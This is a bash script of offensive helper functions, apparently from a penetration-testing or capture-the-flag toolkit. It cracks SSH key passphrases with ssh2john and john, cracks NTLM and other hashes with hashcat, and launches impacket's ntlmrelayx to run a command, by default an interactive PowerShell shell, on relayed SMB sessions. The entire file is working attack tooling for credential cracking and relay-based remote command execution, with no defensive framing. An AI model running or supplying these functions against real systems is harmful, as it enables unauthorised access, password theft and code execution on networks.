#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

crack_ssh_identity() {
    if [[ -z "$identity" ]]; then
        echo "Identity file is not set."
        return 1
    fi
    if [[ -z "$ssh_hash_file" ]]; then
        ssh_hash_file="ssh.hash"
    fi
    ssh2john "$identity" > "$ssh_hash_file"
    john --wordlist=/usr/share/wordlists/rockyou.txt $ssh_hash_file
}

hashcat_generic() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes"
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "$hash_file not found, cannot run hashcat"
        return 1
    fi
    if [[ -z "$hashcat_rule" ]]; then
        hashcat_rule="/usr/share/hashcat/rules/best64.rule"
    fi
    if [[ -z "$hashcat_wordlist" ]]; then
        hashcat_wordlist="/usr/share/wordlists/rockyou.txt"
    fi
    if [[ -z "$hash_mode" ]]; then
        echo "Hash mode must be set before running hashcat."
        return 1
    fi
    echo "$hash_file found, running hashcat for hash mode $hash_mode"
    sudo dos2unix $hash_file
    hashcat -m $hash_mode $hash_file $hashcat_wordlist -r $hashcat_rule --force

}

hashcat_ntlm() {
    hash_mode=1000
    hashcat_generic
}

start_ntlmrelay() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP must be set before running ntlmrelay."
        return 1
    fi
    echo "Starting ntlmrelay on target IP: $target_ip"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    if pgrep -f "ntlmrelayx"; then
        echo "ntlmrelay is already running, skipping."
        return 0
    fi
    sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -c "$cmd" | tee -a $trail_log

}

stop_ntlmrelay() {
    if pgrep -f "ntlmrelayx"; then
        echo "Stopping ntlmrelay..."
        sudo pkill -f "ntlmrelayx"
    else
        echo "No ntlmrelay process found."
    fi
}